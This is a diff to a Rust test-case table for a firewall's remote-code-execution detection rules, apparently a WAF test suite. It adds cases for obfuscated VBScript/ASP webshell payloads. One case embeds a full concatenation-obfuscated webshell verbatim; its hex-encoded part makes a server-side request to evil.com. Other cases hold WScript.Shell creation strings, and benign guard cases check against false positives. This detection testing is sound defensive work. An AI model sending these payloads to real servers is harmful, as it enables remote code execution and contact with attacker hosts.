@@ -289,14 +289,61 @@ pub static CASES: &[Case] = &[
         rules: &[],
         desc: "an ordinary Referer must stay clean under header inspection — P1-B FP guard",
     },
-    // ── documented limit (needs §6 de-obfuscation — out of 10b rules-only) ───────
+    // ── §6-D3: VBScript / Classic-ASP webshell de-obfuscation — now CAUGHT ────────
+    // WIRE ground-truth (pcap bypass-new.txt L8030): the gotestwaf rce-urlparam VBScript
+    // webshell. On the wire the string-concat `&` is a LITERAL query separator, so the
+    // payload shatters across ~33 params — but the fragment carrying `On Error Resume
+    // Next` survives INTACT and fires rce-vbscript-on-error (Critical). Exact wire query
+    // embedded verbatim (percent-encoded, `&`-fragmented).
     Case {
-        id: "rce-vbscript-space-obfuscated",
+        id: "rce-vbscript-asp-webshell-wire",
         module: Module::Rce,
-        field: Field::Query { name: "q", value: "Ev al (\"Ex\"&\"e\"&\"cute(\"\"cmd\"\")" },
+        field: Field::RawQuery("e633eb2c01=Ev%20al%20%28%22Ex%22&%22e%22&%22cute%28%22%22Server.ScriptTimeout=3600:On%20Error%20Resume%20Next:Function%20bd%28byVal%20s%29:For%20i=1%20To%20Len%28s%29%20Step%202:c=M%22&%22i%22&%22d%28s%2Ci%2C2%29:If%20IsNumeric%28M%22&%22i%22&%22d%28s%2Ci%2C1%29%29%20Then:Ex%22&%22e%22&%22cute%28%22%22%22%22bd=bd&c%22&%22h%22&%22r%28&H%22%22%22%22&c&%22%22%22%22%29%22%22%22%22%29:Else:Ex%22&%22e%22&%22cute%28%22%22%22%22bd=bd&c%22&%22h%22&%22r%28&H%22%22%22%22&c&M%22&%22i%22&%22d%28s%2Ci%202%2C2%29&%22%22%22%22%29%22%22%22%22%29:i=i%202:End%20If%22%22&c%22&%22h%22&%22r%2810%29&%22%22Next:End%20Function:Response.Write%28%22%22%22%22@%2Alxl%2A@%22%22%22%22%29:Ex%22&%22e%22&%22cute%28%22%22%22%22On%20Error%20Resume%20Next:%22%22%22%22&bd%28%22%22%22%2244696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229%22%22%22%22%29%29:Response.Write%28%22%22%22%22%2A@lxl@%2A%22%22%22%22%29:Response.End%22%22%29%22%29"),
         min_pl: 1,
-        expect: Expect::ExpectedMiss { until_phase: None },
+        expect: Expect::Triggers,
+        rules: &["rce-vbscript-on-error"],
+        desc: "WIRE: gotestwaf VBScript ASP webshell (rce-urlparam) — `&`-concat fragments the \
+               query, but the intact `On Error Resume Next` fragment fires (§6-D3)",
+    },
+    // De-obf channel lock: the WELL-FORMED form a real attacker sends (`&` percent-encoded
+    // as `%26` → ONE param value). `Server.Cr"&"eateObject(...)` is split by VBScript
+    // concat; `strip_vbscript_concat` fuses it back to `Server.CreateObject(...)`.
+    Case {
+        id: "rce-vbscript-concat-deobf",
+        module: Module::Rce,
+        field: Field::RawQuery("q=Server.Cr%22%26%22eateObject%28%22WScript.Shell%22%29"),
+        min_pl: 1,
+        expect: Expect::Triggers,
+        rules: &["rce-vbscript-createobject"],
+        desc: "well-formed (`%26`) VBScript `\"&\"`-concat Server.Cr\"&\"eateObject → de-obf fuses \
+               to Server.CreateObject(\"WScript.Shell\") (§6-D3 de-obf channel)",
+    },
+    Case {
+        id: "rce-vbscript-createobject-direct",
+        module: Module::Rce,
+        field: Field::Query { name: "q", value: "CreateObject(\"WScript.Shell\")" },
+        min_pl: 1,
+        expect: Expect::Triggers,
+        rules: &["rce-vbscript-createobject"],
+        desc: "direct VBScript/COM webshell sink CreateObject(\"WScript.Shell\")",
+    },
+    // ── benign guards for §6-D3: anchors must keep ordinary input clean ──────────
+    Case {
+        id: "rce-benign-createobject-app",
+        module: Module::Rce,
+        field: Field::Query { name: "q", value: "CreateObject(\"MyApp.Reporting.Service\")" },
+        min_pl: 1,
+        expect: Expect::Clean,
         rules: &[],
-        desc: "VBScript split by spaces/`\"&\"` concat (Ev al, Ex\"&\"e\"&\"cute) — needs §6 de-obfuscation",
+        desc: "non-dangerous progID — createobject rule anchored to WScript/MSXML/ADODB/… (no FP)",
+    },
+    Case {
+        id: "rce-benign-error-prose",
+        module: Module::Rce,
+        field: Field::Query { name: "q", value: "An error occurred, please resume from the next record" },
+        min_pl: 1,
+        expect: Expect::Clean,
+        rules: &[],
+        desc: "prose with error/resume/next words — NOT the exact `On Error Resume Next` statement (no FP)",
     },
 ];
